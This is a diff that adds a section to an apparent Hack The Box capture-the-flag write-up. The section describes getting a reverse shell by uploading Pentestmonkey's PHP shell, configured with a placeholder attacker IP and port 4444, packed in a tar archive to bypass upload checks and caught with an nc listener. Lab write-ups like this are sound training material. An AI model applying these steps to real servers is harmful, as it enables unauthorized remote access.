@@ -240,3 +240,34 @@ Next Steps:
     http://10.10.11.58/modules/shell/shell.php
 
 ![Shell](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss12.png?raw=true)
+
+🧪 4. Exploitation: PHP Reverse Shell Upload
+
+Upon identifying a file upload feature, a PHP reverse shell was weaponized and uploaded to gain remote access.
+
+Steps:
+
+    Cloned reverse shell from Pentestmonkey’s GitHub repo.
+
+    Replaced any shell.php placeholders with the customized php-reverse-shell.php.
+
+    Edited shell with attacker IP and port:
+
+$ip = '10.10.X.X';  // Your tun0 IP
+$port = 4444;       // Your listening port
+
+Packaged the reverse shell into an archive to bypass potential upload restrictions:
+
+tar -czf shell.tar.gz php-reverse-shell.php
+
+Uploaded shell.tar.gz via the web application.
+
+Extracted it on the server (if upload functionality did that automatically or by abusing extraction logic).
+
+Set up listener:
+
+    nc -lvnp 4444
+
+Once triggered, a reverse shell connection was established back to the attacking machine.
+
+
